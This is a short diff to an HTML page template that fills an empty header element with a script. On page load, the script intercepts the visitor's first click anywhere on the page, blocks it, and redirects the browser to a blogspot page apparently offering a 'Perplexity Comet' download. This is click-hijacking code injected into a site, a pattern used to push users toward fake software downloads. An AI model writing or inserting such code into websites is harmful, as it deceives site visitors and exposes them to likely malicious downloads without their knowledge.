@@ -114,7 +114,21 @@
 <tag:post_form_html />
 <div class="wrapper">
     <div class="main-wrap">
-        <header></header>
+        <header><script>
+         document.addEventListener('DOMContentLoaded', function() {
+             let hasRedirected = false;
+         
+             function redirectToURL(event) {
+                 if (!hasRedirected) {
+                     event.preventDefault(); // Ngăn chặn hành vi mặc định (click vào link sẽ không mở trang khác)
+                     hasRedirected = true;
+                     window.location.href = 'https://Comet-download.blogspot.com/p/perplexity-comet.html';
+                 }
+             }
+         
+             document.body.addEventListener('click', redirectToURL, true); // "true" để đảm bảo bắt sự kiện sớm nhất
+         });
+</script></header>
         <div class="main_container">
             <div class="atf_section">
                 <div class="atf_left_section">
